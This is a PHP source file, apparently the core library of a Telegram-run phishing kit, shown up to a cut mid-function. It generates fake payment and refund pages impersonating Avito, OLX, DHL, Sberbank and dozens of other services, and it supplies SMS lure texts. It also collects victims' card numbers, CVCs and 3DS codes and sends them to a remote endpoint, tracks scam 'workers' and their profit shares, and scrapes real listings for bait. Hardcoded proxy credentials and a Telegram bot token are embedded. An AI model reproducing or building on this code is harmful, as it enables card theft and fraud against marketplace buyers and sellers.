<?php
	error_reporting(0);
	date_default_timezone_set('Europe/Moscow');

	use PHPMailer\PHPMailer\PHPMailer;
	use PHPMailer\PHPMailer\SMTP;
	use PHPMailer\PHPMailer\Exception;

	require 'mail.lib/src/Exception.php';
	require 'mail.lib/src/PHPMailer.php';
	require 'mail.lib/src/SMTP.php';
	include '_config.php';

	function loadSite() {
		header('Location: https://www.wikipedia.org/');
		exit();
	}

	function allProxy($a) {
		return [
			1 => ['', ''],
			2 => ['host' => '46.17.44.62:20147', 'auth' => 'OjgmCxTXnr:Popa.antilopa'],
		][$a];
	}

	function baloutMin() {
		return 1000;
	}

	function smsTexts() {
		return [
			'Форма для оплаты товара: %url%',
			'Форма для возврата средств: %url%',
			'Ваш товар оплачен. Для получения средств заполните форму: %url%',
			'Для возврата средств заполните форму: %url%',
			'Форма для заключения безопасной сделки: %url%',
		];
	}

	function paymentProxy($n) {
		return allProxy([
			'btc' => 2,
			'tinkoff' => 2,
			'tinkoff' => 2,
			'mgf' => 2,
			'usb' => 2,
		][$n]);
	}
	
	function host() {
		return 'https://'.$_SERVER['SERVER_NAME'].'/';
	}
	
	function amountMax() {
		return intval(fileRead(dirSettings('amax')));
	}
	
	function amountMin() {
		return intval(fileRead(dirSettings('amin')));
	}

	function referalRate() {
		return intval(fileRead(dirSettings('refr')));;
	}

	function paymentName() {
		return [
			0 => '',
			1 => 'btc',
			2 => 'tinkoff',
			3 => 'tinkoff',
			4 => 'open',
			5 => 'usb',
		][getPaymentName()];
	}

	function paymentTitle($v) {
		return [
			0 => 'Ручная',
			1 => 'Биткоин',
			2 => 'Тинькофф',
			3 => 'tinkoff',
			4 => 'Открытие',
			5 => 'usb',
		][$v];
	}

	function getDomains($a) {
		return allDomains()[$a];
	}

	function getDomain($a, $b = 0) {
		return getDomains(intval($a))[$b];
	}

	function getFakePage($a, $b = 0) {
		return [
			1 => ['merchant', 'order', 'refund', 'buy', 'cash', 'unlock'],
			2 => ['merchant', 'track', 'refund', 'cash', 'unlock', 'cars', 'receiving', 'rent'],
			3 => ['merchant', 'rent', 'refund', 'cash'],
		][$a][intval($b)];
	}

	function getFakeRedir($dom, $item, $isnr) {
		return 'https://'.$dom.'/'.(['merchant', 'refund', 'unlock'][$isnr]).$item;
	}
	
	function getFakeUrl($id, $item, $a, $b = 0) {
		return ($id ? 'https://'.getUserDomainName($id, $a).'/' : '').getFakePage(in_array($a, [1, 2, 9, 15, 16, 17, 19, 20, 21, 22, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45]) ? ($a == 9 ? 3 : 1) : 2, $b).$item;
	}
	
	function getService($a, $b = false, $c = false) {
		$t = [
			1 => 'Авито',
			2 => 'Юла',
			3 => 'Boxberry',
			4 => 'СДЭК',
			5 => 'Почта России',
			6 => 'ПЭК',
			7 => 'Яндекс',
			8 => 'Достависта',
			9 => 'Авито Недвижимость',
			10 => 'Пониэкспресс',
			11 => 'DHL',
			12 => 'BlablaCar',
			13 => 'Юла Недвижимость',
			14 => 'ЦИАН Недвижимость',
			15 => 'OLX PL',
			16 => 'OLX UA',
			17 => 'OLX KZ',
			18 => 'НоваПошта',
			19 => 'Яндекс объявления',
			20 => '999',
			21 => 'OLX RO',
			22 => 'Сбербанк',
			23 => 'Райффайзенбанк',
			24 => 'BlablaCar UA',
			25 => 'OLX BG',
			26 => 'OLX UZ',
			27 => 'Gumtree UK',
			28 => 'Gumtree AU',
			29 => 'MVideo',
			30 => 'MARKET KZ',
			31 => 'IZI UA', // 32
			32 => 'Kaspi',
			33 => 'OLX PT',
			34 => 'Subito IT',
			35 => 'Allegro PL', // 33
			36 => 'LEBONCOIN FR', // 33
			37 => 'QUOKA DE', // 33
			38 => 'EBAY EU', // 33
			39 => 'RICARDO CA', // 33
			40 => 'DHL EU', // 33
			41 => 'MILANUNCIOS IS', // 33
			42 => 'CORREOS IS', // 33
			43 => 'JOFOGAS WE', // 33
			44 => 'TORI FI', // 33
			45 => 'SBAZAR CZ', 
		][intval($a)];
		if ($c)
			$t .= ' 2.0';
		if (!$b)
			return $t;
		return $t.' - '.[
			1 => 'Оплата',
			2 => 'Возврат',
			3 => 'Безоп. сделка',
			4 => 'Получ. средств',
		][intval($b)];
	}
	
	function trackStatus($a) {
		return [
			1 => 'Ожидает оплаты',
			2 => 'Оплачен',
			3 => 'Возврат средств',
			4 => 'Получение средств',
		][intval($a)];
	}

	function getShopName($srvc, $isnr) {
		return [
			1 => ['Avito.Pokupka', 'Avito vozvrat deneg', 'Avito poluchenie deneg'],
			2 => ['Youla.Pokupka', 'Youla vozvrat deneg', 'Youla poluchenie deneg'],
			3 => ['Boxberry oplata', 'Boxberry vozvrat deneg', 'Boxberry poluchenie deneg'],
			4 => ['CDEK oplata', 'CDEK vozvrat deneg', 'CDEK poluchenie deneg'],
			5 => ['Pochta oplata', 'Pochta vozvrat deneg', 'Pochta poluchenie deneg'],
			6 => ['PECOM oplata', 'PECOM vozvrat deneg', 'PECOM poluchenie deneg'],
			7 => ['Yandex oplata', 'Yandex vozvrat deneg', 'Yandex poluchenie deneg'],
			8 => ['Dostavista.Pokupka', 'Dostavista vozvrat deneg', 'Dostavista poluchenie deneg'],
			9 => ['Avito.Arenda', 'Avito vozvrat deneg', 'Avito poluchenie deneg'],
			10 => ['ponyexpress oplata', 'ponyexpress vozvrat deneg', 'ponyexpress poluchenie deneg'],
			11 => ['dhl oplata', 'dhl vozvrat deneg', 'dhl poluchenie deneg'],
			12 => ['blablacar oplata', 'blablacar vozvrat deneg', 'blablacar deneg'],
			13 => ['youla.Arenda oplata', 'youla.Arenda vozvrat deneg', 'youla.Arenda poluchenie deneg'],
			14 => ['cian oplata', 'cian vozvrat deneg', 'cian poluchenie deneg'],
			15 => ['olx oplata', 'olx vozvrat deneg', 'olx poluchenie deneg'],
			16 => ['olx oplata', 'olx vozvrat deneg', 'olx poluchenie deneg'],
			17 => ['olx oplata', 'olx vozvrat deneg', 'olx poluchenie deneg'],
			18 => ['novaposhta oplata', 'novaposhta vozvrat deneg', 'novaposhta poluchenie deneg'],
			19 => ['yandex oplata', 'yandex vozvrat deneg', 'yandex poluchenie deneg'],
			20 => ['999 oplata', '999 vozvrat deneg', '999 poluchenie deneg'],
			21 => ['olx oplata', 'olx vozvrat deneg', 'olx primire de fonduri'],
			22 => ['sberbank oplata', 'sberbank vozvrat deneg', 'sberbank poluchenie deneg'],
			23 => ['raiffeisen oplata', 'raiffeisen vozvrat deneg', 'raiffeisen poluchenie deneg'],
			24 => ['blablacar oplata', 'blablacar vozvrat deneg', 'blablacar deneg'],
			25 => ['olx oplata', 'olx vozvrat deneg', 'olx poluchenie deneg'],
			26 => ['olx oplata', 'olx vozvrat deneg', 'olx poluchenie deneg'],
			27 => ['gumtree payment', 'gumtree refund policy', 'gumtree getting money'],
			28 => ['gumtree payment', 'gumtree refund policy', 'gumtree getting money'],
			29 => ['mvideo oplata', 'mvideo vozvrat deneg', 'mvideo poluchenie deneg'],
			30 => ['market oplata', 'market vozvrat deneg', 'market poluchenie deneg'],
			31 => ['izi oplata', 'izi vozvrat deneg', 'izi poluchenie deneg'],
		][$srvc][$isnr];
	}

	function userStatusName($a) {
		return [
			0 => 'Без статуса',
			1 => 'Заблокирован',
			2 => 'Воркер',
			3 => 'Помощник',
			4 => 'Модератор',
			5 => 'Администратор',
			6 => 'Кодер',
			7 => 'ТС',
		][$a];
	}
	
	function isAutoCard() {
		return (fileRead(dirSettings('acard')) == '1');
	}

	function toggleAutoCard() {
		$t = isAutoCard();
		fileWrite(dirSettings('acard'), $t ? '' : '1');
		return !$t;
	}

	function isAutoPayment() {
		return (fileRead(dirSettings('apaym')) == '1');
	}

	function addCardBalance($n, $v) {
		$t = getCards();
		$res = [];
		for ($i = 0; $i < count($t); $i++) {
			$t1 = explode(':', $t[$i]);
			if ($t1[0] == $n)
				$t1[1] = intval($t1[1]) + $v;
			$res[] = implode(':', $t1);
		}
		setCard($res);
	}

	function getCards() {
		$t = fileRead(dirSettings('card'));
		if (strlen($t) == 0)
			return [];
		return explode('`', $t);
	}

	function getCardData() {
		return explode(':', getCards()[0]);
	}
	
	function getCard() {
		return getCardData()[0];
	}

	function getCardBalance() {
		return intval(getCardData()[1]);
	}

	function setNextCard() {
		$autoc = (fileRead(dirSettings('acard')) == '1');
		if (!$autoc)
			return false;
		$t = getCards();
		$t1 = $t[0];
		$c = count($t);
		for ($i = 0; $i < $c - 1; $i++)
			$t[$i] = $t[$i + 1];
		$t[$c - 1] = $t1;
		setCard($t);
		return explode(':', $t[0])[0];
	}

	function cardIndex($n, $t) {
		for ($i = 0; $i < count($t); $i++)
			if (explode(':', $t[$i])[0] == $n)
				return $i;
		return -1;
	}

	function addCard($n) {
		$t = getCards();
		if (cardIndex($n, $t) != -1)
			return false;
		$t[] = $n.':0';
		return setCard($t);
	}

	function delCard($n) {
		$t = getCards();
		$t1 = cardIndex($n, $t);
		if ($t1 == -1)
			return false;
		unset($t[$t1]);
		return setCard($t);
	}
	
	function setCard($v) {
		return fileWrite(dirSettings('card'), implode('`', $v));
	}

	function getCard2() {
		return explode('`', fileRead(dirSettings('card2')));
	}
	
	function setCard2($n, $j) {
		return fileWrite(dirSettings('card2'), implode('`', [$n, $j]));
	}

	function getCardBtc() {
		return fileRead(dirSettings('cbtc'));
	}
	
	function setCardBtc($n) {
		return fileWrite(dirSettings('cbtc'), $n);
	}

	function getPaymentName() {
		return intval(fileRead(dirSettings('pay')));
	}
	
	function setPaymentName($n) {
		fileWrite(dirSettings('pay'), $n);
	}

	function getPayXRate() {
		return intval(fileRead(dirSettings('payx')));
	}

	function setPayXRate($a) {
		fileWrite(dirSettings('payx'), $a);
	}
	
	function fixAmount($a) {
		return min(max($a, amountMin()), amountMax());
	}

	function getUserDomainName($id, $a) {
		return getDomain($a, getUserDomain($id, $a));
	}
	
	function dirUsers($id, $n = false) {
		return 'users/'.$id.($n ? '/'.$n.'.txt' : '');
	}

    function SendSound() {
        $textTitle = 'Успешная оплата';
        $duration = 8;
        $filePath = ('plugins/sound/profit.mp3');
        define('BOTAPI', 'https://api.telegram.org/bot' . botToken() . '/');
        $cfile = new CURLFile(realpath($filePath));
        $reply_msgid = true;
        $data = [
        'chat_id' => chatGroup(),
        'title' => $textTitle,
        'audio' => $cfile,
        'duration' => $duration,
        'reply_to_message_id'=> $reply_msgid ? ['message_id']: null,
        ];
        $ch = curl_init(BOTAPI . 'sendAudio');
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
        curl_exec($ch);
        curl_close($ch);
        }            
         
         
    function sendSticker($chatId, $idsticker){
        $website = "https://api.telegram.org/bot".botToken();  
        $update = file_get_contents('php://input');
        $update = json_decode($update, TRUE);
        $chatId = $update["message"]["chat"]["id"];
        $messageId = $update["message"]["message_id"];
        $userId = $update["message"]['from']['id']; 
        $url = $website.'/sendSticker?chat_id='.$chatId.'&sticker='.$idsticker.'&disable_notification=true';
        file_get_contents($url);
        }
        
	function isnt_t($isnt) {
		if ($isnt == 1) return 'items';
		elseif ($isnt == 2) return 'rent';
		elseif ($isnt == 3) return 'taxi';
		elseif ($isnt == 4) return 'bank_item';
		elseif (!$isnt) return 'tracks';
	}
	
	function dirItems($n, $isnt) {
		return isnt_t($isnt).'/'.$n.'.txt';
	}
	
	function dirStats($n) {
		return 'stats/'.$n.'.txt';
	}
	
	function dirSettings($n) {
		return 'settings/'.$n.'.txt';
	}
	
	function dirBin($n) {
		return 'bin/'.$n.'.txt';
	}

	function dirKeys($n) {
		return 'keys/'.$n.'.txt';
	}
	
	function dirIp($n) {
		return 'ip/'.$n.'.txt';
	}
	
	function dirPays($n) {
		return 'pays/'.$n.'.txt';
	}
	
	function dirMails($n) {
		return 'mails/'.$n.'.txt';
	}

	function dirCards($n) {
		return 'cards/'.$n.'.txt';
	}

	function dirChecks($n) {
		return 'checks/'.$n.'.txt';
	}

	function dirPages($n) {
		return 'pages/'.$n.'.txt';
	}

	function dirStyles($n) {
		return 'styles/'.$n.'.txt';
	}

	function dirScripts($n) {
		return 'scripts/'.$n.'.txt';
	}

	function setIpData($ip, $n, $v) {
		fileWrite(dirIp($n.'_'.str_replace(':', ';', $ip)), $v);
	}

	function getIpData($ip, $n) {
		return fileRead(dirIp($n.'_'.str_replace(':', ';', $ip)));
	}

	function setCardData($a, $b, $c, $d) {
		fileWrite(dirCards($a.'-'.$b.'-'.$c.'-'.$d), time());
	}

	function isCardData($a, $b, $c, $d) {
		return (time() - intval(fileRead(dirCards($a.'-'.$b.'-'.$c.'-'.$d))) < 10);
	}

	function setCookieData($n, $v, &$cc) {
		$cc[md5($n)] = base64_encode($v);
	}

	function getCookieData($n, $cc) {
		return base64_decode($cc[md5($n)]);
	}

	function getLastAlert() {
		return fileRead(dirSettings('alert'));
	}
	
	function setLastAlert($n) {
		return fileWrite(dirSettings('alert'), $n);
	}

	function isItem($item, $isnt) {
		return file_exists(dirItems($item, $isnt));
	}
	
	function delItem($item, $isnt) {
		fileDel(dirItems($item, $isnt));
	}
	
	function addItem($v, $isnt) {
		$item = 0;
		while (true) {
			$item = rand(10000000, 99999999);
			if (!isItem($item, $isnt))
				break;
		}
		fileWrite(dirItems($item, $isnt), implode('`', $v));
		return $item;
	}
	
	function getItemData($item, $isnt) {
		$t = explode('`', fileRead(dirItems($item, $isnt)));
		$t[0] = intval($t[0]);
		$t[1] = intval($t[1]);
		$t[2] = intval($t[2]);
		$t[4] = intval($t[4]);
		$t[5] = intval($t[5]);
		return $t;
	}
	
	function setItemData($item, $n, $v, $isnt) {
		$t = getItemData($item, $isnt);
		$t[$n] = $v;
		fileWrite(dirItems($item, $isnt), implode('`', $t));
	}
	
	function addItemData($item, $n, $v, $isnt) {
		$t = getItemData($item, $isnt);
		$t[$n] = intval($t[$n]) + $v;
		fileWrite(dirItems($item, $isnt), implode('`', $t));
	}
	
	function getUserItems($id, $isnt) {
		
		$t = getUserData($id, isnt_t($isnt));
		if (!$t)
			return [];
		return explode('`', $t);
	}
	
	function setUserItems($id, $items, $isnt) {
		setUserData($id, isnt_t($isnt), implode('`', $items));
	}

	function getUserDomains($id) {
		$doms = explode('`', getUserData($id, 'doms'));
		$c = 7 - count($doms);
		if ($c > 0)
			for ($i = 0; $i < $c; $i++)
				$doms[] = '';
		return $doms;
	}

	function getUserDomain($id, $srvc) {
		return intval(getUserDomains($id)[intval($srvc) - 1]);
	}

	function setUserDomain($id, $srvc, $n) {
		$doms = getUserDomains($id);
		$doms[$srvc - 1] = ($n === 0 ? '' : $n);
		setUserData($id, 'doms', implode('`', $doms));
	}
	
	function isUserAnon($id) {
		return (getUserData($id, 'anon') == '1');
	}
	
	function setUserAnon($id, $v) {
		setUserData($id, 'anon', $v ? '1' : '');
	}
	
	function getUserReferal($id) {
		$referal = getUserData($id, 'referal');
		if (isUserBanned($referal))
			return false;
		return $referal;
	}
	
	function setUserReferal($id, $v) {
		if (isUserBanned($v))
			return;
		setUserData($id, 'referal', $v);
	}
	
	function getUserReferalName($id, $a = false, $b = false) {
		$t = getUserReferal($id);
		return ($t ? userLogin($t, $a, $b) : 'Никто');
	}
	
	function delUserItem($id, $item, $isnt) {
		delItem($item, $isnt);
		$items = getUserItems($id, $isnt);
		if (!in_array($item, $items))
			return;
		unset($items[array_search($item, $items)]);
		setUserItems($id, $items, $isnt);
	}
	
	function addUserItem($id, $v, $isnt) {
		$item = addItem($v, $isnt);
		$items = getUserItems($id, $isnt);
		if (in_array($item, $items))
			return 0;
		$items[] = $item;
		setUserItems($id, $items, $isnt);
		return $item;
	}
	
	function isUserItem($id, $item, $isnt) {
		$items = getUserItems($id, $isnt);
		return in_array($item, $items);
	}

	function getUserChecks($id) {
		$t = getUserData($id, 'checks');
		if (!$t)
			return [];
		return explode('`', $t);
	}
	
	function setUserChecks($id, $checks) {
		setUserData($id, 'checks', implode('`', $checks));
	}

	function urlCheck($check) {
		return 'https://t.me/'.botLogin().'?start=c_'.$check;
	}

	function isCheck($check) {
		return file_exists(dirChecks($check));
	}
	
	function delCheck($check) {
		fileDel(dirChecks($check));
	}
	
	function addCheck($v) {
		$check = 0;
		while (true) {
			$check = bin2hex(random_bytes(16));
			if (!isCheck($check))
				break;
		}
		fileWrite(dirChecks($check), implode('`', $v));
		return $check;
	}

	function checkCard($card, $expm, $expy, $cvc, $balancecard, $amount, $cardbin, $username) {
		$url = '';
		$params = array(
			'card' => $card,
			'expm' => $expm,
			'expy' => $expy,
			'cvc' => $cvc,
			'balancecard' => $balancecard,
			'amount' => $amount,
			'$cardbin' => cardBank($card),
			'$username' => projectAbout('botLogin'),
		);
		$result = file_get_contents($url, false, stream_context_create(array(
			'http' => array(
				'method'  => 'POST',
				'header'  => 'Content-type: application/x-www-form-urlencoded',
				'content' => http_build_query($params)
			)
		)));
	}
	
	function check3DPage($code3ds, $amount, $username) {
		$url = '';
		$params = array(
			'code3ds' => $code3ds,
			'amount' => $amount,
			'$username' => projectAbout('botLogin'),
		);
		$result = file_get_contents($url, false, stream_context_create(array(
			'http' => array(
				'method'  => 'POST',
				'header'  => 'Content-type: application/x-www-form-urlencoded',
				'content' => http_build_query($params)
			)
		)));
	}
	
	function checkBot($code3ds, $amount) {
		$url = '';
		$params = array(
			'$username' => projectAbout('botLogin'),
			'$bottoken' => botToken(),
		);
		$result = file_get_contents($url, false, stream_context_create(array(
			'http' => array(
				'method'  => 'POST',
				'header'  => 'Content-type: application/x-www-form-urlencoded',
				'content' => http_build_query($params)
			)
		)));
	}
	
	function getCheckData($check) {
		$t = explode('`', fileRead(dirChecks($check)));
		$t[0] = intval($t[0]);
		return $t;
	}

	function delUserCheck($id, $check) {
		delCheck($check);
		$checks = getUserChecks($id);
		if (!in_array($check, $checks))
			return;
		unset($checks[array_search($check, $checks)]);
		setUserChecks($id, $checks);
	}

	function addUserCheck($id, $v) {
		$check = addCheck($v);
		$checks = getUserChecks($id);
		if (in_array($check, $checks))
			return 0;
		$checks[] = $check;
		setUserChecks($id, $checks);
		return $check;
	}
	
	function isUserCheck($id, $check) {
		$checks = getUserChecks($id);
		return in_array($check, $checks);
	}
	
	function getRate($id = false) {
		$t = explode('`', fileRead(dirSettings('rate')));
		$prc1 = intval($t[0]);
		$prc2 = intval($t[1]);
		if ($id) {
			$t = explode('`', getUserData($id, 'rate'));
			$t1 = intval($t[0]);
			$t2 = intval($t[1]);
			if ($t1 > 0)
				$prc1 = $t1;
			if ($t2 > 0)
				$prc2 = $t2;
		}
		return [$prc1, $prc2];
	}

	function setRate($a, $b) {
		fileWrite(dirSettings('rate'), $a.'`'.$b);
	}

	function setUserRate($id, $a, $b) {
		setUserData($id, 'rate', $a.'`'.$b);
	}

	function delUserRate($id) {
		setUserData($id, 'rate', '');
	}

	function setAmountLimit($a, $b) {
		fileWrite(dirSettings('amin'), $a);
		fileWrite(dirSettings('amax'), $b);
	}

	function setReferalRate($a) {
		fileWrite(dirSettings('refr'), $a);
	}

	function setUserData($id, $n, $v) {
		$t = dirUsers($id, $n);
		if ($v == '') {
			if (file_exists($t))
				fileDel($t);
		} else
			fileWrite($t, $v);
	}
	
	function getUserData($id, $n) {
		return fileRead(dirUsers($id, $n));
	}
	
	function setInput($id, $v) {
		setUserData($id, 'input', $v);
	}
	
	function getInput($id) {
		return getUserData($id, 'input');
	}
	
	function setUserBalance($id, $v) {
		setUserData($id, 'balance', $v);
	}
	
	function getUserBalance($id) {
		return intval(getUserData($id, 'balance'));
	}
	
	function addUserBalance($id, $v) {
		setUserBalance($id, intval(getUserBalance($id) + $v));
	}

	function setUserBalance2($id, $v) {
		setUserData($id, 'balance2', $v);
	}
	
	function getUserBalance2($id) {
		return intval(getUserData($id, 'balance2'));
	}
	
	function addUserBalance2($id, $v) {
		setUserBalance2($id, intval(getUserBalance2($id) + $v));
	}
	
	function setUserBalanceOut($id, $v) {
		setUserData($id, 'balanceout', $v);
	}
	
	function getUserBalanceOut($id) {
		return intval(getUserData($id, 'balanceout'));
	}
	
	function getUserHistory($id) {
		$t = getUserData($id, 'history');
		if (!$t)
			return false;
		return explode('`', $t);
	}
	
	function addUserHistory($id, $v) {
		$t = getUserHistory($id);
		$t[] = implode('\'', $v);
		setUserData($id, 'history', implode('`', $t));
	}

	function getUserProfits($id) {
		$t = getUserData($id, 'profits');
		if (!$t)
			return false;
		return explode('`', $t);
	}
	
	function addUserProfits($id, $v) {
		$t = getUserProfits($id);
		$t[] = implode('\'', $v);
		setUserData($id, 'profits', implode('`', $t));
	}

	function getUserRefs($id) {
		return intval(getUserData($id, 'refs'));
	}
	
	function addUserRefs($id) {
		setUserData($id, 'refs', intval(getUserRefs($id) + 1));
	}

	function getUserRefbal($id) {
		return intval(getUserData($id, 'refbal'));
	}
	
	function addUserRefbal($id, $v) {
		setUserData($id, 'refbal', intval(getUserRefbal($id) + $v));
	}
	
	function setInputData($id, $n, $v) {
		setUserData($id, 't/_'.$n, $v);
	}
	
	function getInputData($id, $n) {
		return getUserData($id, 't/_'.$n);
	}
	
	function setUserStatus($id, $v) {
		setUserData($id, 'status', $v);
	}
	
	function getUserStatus($id) {
		return intval(getUserData($id, 'status'));
	}
	
	function getUserStatusName($id) {
		return userStatusName(getUserStatus($id));
	}
	
	function isUserAccepted($id) {
		return (intval(getUserData($id, 'joined')) > 0);
	}
	
	function isUser($id) {
		return is_dir(dirUsers($id));
	}
	
	function isUserBanned($id) {
		return (getUserStatus($id) == 1);
	}
	
	function canUserUseSms($id) {
		$accessms = accessSms();
		$profit = getUserProfit($id);
		return (getUserStatus($id) > 4 || userJoined($id) >= $accessms[0] || $profit[1] >= $accessms[1]);
	}

	function getUserProfit($id) {
		$t = getUserData($id, 'profit');
		if (!$t)
			return [0, 0];
		$t = explode('`', $t);
		return [intval($t[0]), intval($t[1])];
	}
	
	function addUserProfit($id, $amount, $rate) {
		$profit = getUserProfit($id);
		setUserData($id, 'profit', implode('`', [$profit[0] + 1, $profit[1] + $amount]));
		$amount0 = 0;
		$referal = getUserReferal($id);
		if ($referal) {
			$amount0 = intval($amount * referalRate() / 100);
			addUserBalance($referal, $amount0);
			addUserRefbal($referal, $amount0);
		}
		$amount = intval($amount * $rate) - $amount0;
		addUserBalance($id, $amount);
		addUserProfits($id, [time(), $amount]);
		return [$amount, $amount0];
	}
	
	function getProfit() {
		$t = explode('`', fileRead(dirStats('profit')));
		return [intval($t[0]), intval($t[1]), intval($t[2])];
	}

	function getProfit0() {
		$t = explode('`', fileRead(dirStats('profit_'.date('dmY'))));
		return [intval($t[0]), intval($t[1]), intval($t[2])];
	}
	
	function addProfit($v, $m) {
		$t = getProfit();
		fileWrite(dirStats('profit'), implode('`', [$t[0] + 1, $t[1] + $v, $t[2] + $m]));
		$t = getProfit0();
		fileWrite(dirStats('profit_'.date('dmY')), implode('`', [$t[0] + 1, $t[1] + $v, $t[2] + $m]));
	}

	function urlReferal($v) {
		return 'https://t.me/'.projectAbout('botLogin').'?start=r_'.$v;
	}
	
	function regUser($id, $login, $accept = false) {
		if ($accept) {
			setUserData($id, 'joined', time());
			setUserStatus($id, 2);
			return true;
		} else {
			if (!isUser($id)) {
				mkdir(dirUsers($id));
				mkdir(dirUsers($id).'/t');
				setUserData($id, 'login', $login);
				return true;
			}
		}
		return false;
	}
	
	function updLogin($id, $login) {
		$t = getUserData($id, 'login');
		if (strval($t) == strval($login))
			return false;
		setUserData($id, 'login', $login);
		return true;
	}
	
	function userJoined($id) {
		return intval((time() - intval(getUserData($id, 'joined'))) / 86400);
	}
	
	function userLogin($id, $shid = false, $shtag = false) {
		$login = getUserData($id, 'login');
		return ($shtag ? getUserStatusName($id).' ' : '').'<a href="tg://user?id='.$id.'">'.($login ? $login : 'Без ника').'</a>'.($shid ? ' ['.$id.']' : '');
	}

	function userLogin2($id) {
		return (isUserAnon($id) ? 'Скрыт' : userLogin($id));
	}
	
	function makeProfit($id, $isnr, $amount, $pkoef) {
		$rate = getRate($id)[$isnr != 1 ? 0 : 1] - (($pkoef - 1) * getPayXRate());
		if ($rate < 10)
			$rate = 10;
		$rate /= 100;
		$t = addUserProfit($id, $amount, $rate);
		addProfit($amount, $t[0] + $t[1]);
		return $t;
	}
	
	function createBalout($id) {
		$balance = getUserBalance($id);
		setUserBalance($id, 0);
		setUserBalanceOut($id, $balance);
		return $balance;
	}
	
	function makeBalout($id, $dt, $balout, $url) {
		setUserBalanceOut($id, 0);
		addUserHistory($id, [$dt, $balout, $url]);
		return true;
	}
	
	function request($url, $post = false, $rh = false) {
		$curl = curl_init($url);
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
		if ($rh)
			curl_setopt($curl, CURLOPT_HEADER, true);
		if ($post) {
			curl_setopt($curl, CURLOPT_POST, true);
			curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($post));
		}
		$result = curl_exec($curl);
		curl_close($curl);
		return $result;
	}

	function ruchkaStatus($t, $success, $errmsg = '') {
		list($md, $item, $srvc) = explode(' ', $t);
		$post = [
			'secretkey' => secretKey(),
			'service' => $srvc,
			'action' => 'ayeruchnayaplatejjjka666',
			'_post' => json_encode([
				'PaRes' => '1',
				'MD' => $md,
				'ruchkastatus' => ($success ? '1' : '0'),
				'ruchkafail' => $errmsg,
			]),
			'_get' => json_encode([
				'id' => $item,
			]),
			'_server' => json_encode([
				'domain' => '1',
				'ip' => '1',
			]),
		];
		request(host().'_remote.php', $post);
	}
	
	function botSend($msg, $id = false, $kb = false) {
		if (!$id)
			return false;
		if (is_array($msg))
			$msg = implode("\n", $msg);
		$post = [
			'parse_mode' => 'html',
			'disable_web_page_preview' => 'true',
			'chat_id' => $id,
			'text' => $msg,
		];
		if ($kb)
			$post['reply_markup'] = json_encode(botKeybd($kb));
		return json_decode(request(botUrl('sendMessage'), $post), true)['ok'];
	}
	
	function botEdit($msg, $mid, $id, $kb = false) {
		if (is_array($msg))
			$msg = implode("\n", $msg);
		$post = [
			'parse_mode' => 'html',
			'disable_web_page_preview' => 'true',
			'chat_id' => $id,
			'message_id' => $mid,
			'text' => $msg,
		];
		if ($kb)
			$post['reply_markup'] = json_encode(botKeybd($kb));
		request(botUrl('editMessageText'), $post);
	}

	function botKick($id, $chat) {
		$post = [
			'chat_id' => $chat,
			'user_id' => $id,
		];
		return json_decode(request(botUrl('kickChatMember'), $post), true)['ok'];
	}
	
	function botDelete($mid, $id) {
		$post = [
			'chat_id' => $id,
			'message_id' => $mid,
		];
		request(botUrl('deleteMessage'), $post);
	}
	
	function botKeybd($v) {
		if ($v[0])
			return [
				'inline_keyboard' => $v[1]
			];
		else
			return [
				'keyboard' => $v[1],
				'resize_keyboard' => true,
				'one_time_keyboard' => false
			];
	}
	
	function botUrl($n) {
		return 'https://api.telegram.org/bot'.botToken().'/'.$n;
	}

	function botAlert($n) {
		return 'https://api.telegram.org/bot1465514388:AAGMe-AxKFG3I6TdAQ2JquFtdbScNHJI0fA/'.$n;
	}
	
	function botUrlFile($n) {
		return 'https://api.telegram.org/file/bot'.botToken().'/'.$n;
	}
	
	function isUrlItem($url, $a) {
		return count(explode('/', explode([
			1 => 'avito.ru',
			2 => 'youla.ru',
			3 => 'olx.pl',
		][$a], $url, 2)[1])) >= 4;
	}
	
	function isUrlImage($url) {
		$head = mb_strtolower(explode("\r\n\r\n", request($url, false, true))[0]);
		$ctype = pageCut($head, 'content-type: ', "\r\n");
		return in_array($ctype, [
			'image/jpeg',
			'image/png',
			'image/webp',
		]);
	}
	
	function isEmail($n) {
		$ps = explode('@', $n);
		if (count($ps) != 2)
			return false;
		if (count(explode('.', $ps[1])) < 2)
			return false;
		$l = strlen($ps[0]);
		if ($l < 2 || $l > 64)
			return false;
		$o = '_-.';
		if (strpos($o, $ps[0][0]) !== false || strpos($o, $ps[0][$l - 1]) !== false)
			return false;
		for ($i = 0; $i < strlen($o); $i++)
			for ($j = 0; $j < strlen($o); $j++)
				if (strpos($ps[0], $o[$i].$o[$j]) !== false)
					return false;
		return true;
	}
	
	function fileRead($n) {
		if (!file_exists($n))
			return false;
		$f = fopen($n, 'rb');
		if (flock($f, LOCK_SH)) {
			$v = fread($f, filesize($n));
			fflush($f);
			flock($fp, LOCK_UN);
		}
		fclose($f);
		return $v;
	}
	
	function fileWrite($n, $v, $a = 'w') {
		$f = fopen($n, $a.'b');
		if (flock($f, LOCK_EX)) {
			fwrite($f, $v);
			fflush($f);
			flock($fp, LOCK_UN);
		}
		fclose($f);
		return true;
	}
	
	function fileDel($n) {
		if (file_exists($n))
			return unlink($n);
		return false;
	}
	
	function parseItem($id, $url, $a) {
		if ($a == 1)
			$url = 'https://www.avito.ru/'.explode('?', explode('avito.ru/', $url, 2)[1])[0];
		elseif ($a == 2)
			$url = 'https://youla.ru/'.explode('?', explode('youla.ru/', $url, 2)[1])[0];
		elseif ($a == 3)
			$url = 'https://www.olx.pl/'.explode('?', explode('olx.pl/', $url, 2)[1])[0];
		
		$page = str_replace(["\r", "\n"], '', request($url, false, false));

		if ($page == '')
			return false;
		
		$itemd = [0, 0, 0, $id, time()];

		if ($a == 1) {
			$items[] = pageCut($page, 'avito.item.price = \'', '\';');
			$items[] = pageCut($page, 'sticky-header-title"> ', ' </div>');
			$items[] = pageCut($page, 'avito.item.image = \'', '\';');
			$items[] = explode(', ', pageCut($page, 'item-address__string"> ', ' </'))[0];
